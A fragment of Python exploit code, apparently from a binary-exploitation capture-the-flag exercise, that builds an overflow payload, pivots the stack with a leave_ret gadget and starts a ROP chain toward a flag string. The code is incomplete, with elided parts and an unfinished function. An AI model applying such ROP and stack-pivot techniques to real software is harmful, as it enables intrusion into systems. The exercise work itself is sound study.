...
def leak_read():
    heap_stack = 0x605000 # Try higher
    payload = b'A' * 32
    payload += b'B' * 8 
    ...
    # Chain 3: Pivot using pop rsp
    # We need pop rsp gadget address.
    # But we don't have leak yet.
    # Wait, I construct this payload BEFORE leak.
    # I cannot use pop rsp gadget from libc if I don't have leak.
    # I MUST use binary gadget.
    # I used leave_ret from binary.
    # So I MUST use leave_ret.
    pass
...
# Stage 2 ROP
# heap_stack = 0x605000.
# Payload starts at 0x605000.
# leave_ret pops rbp (8 bytes). Then ret.
payload2 = b'J' * 8 
payload2 += p64(gadget_pop_rdi)

flag_str_loc = 0x605000 + 0x400
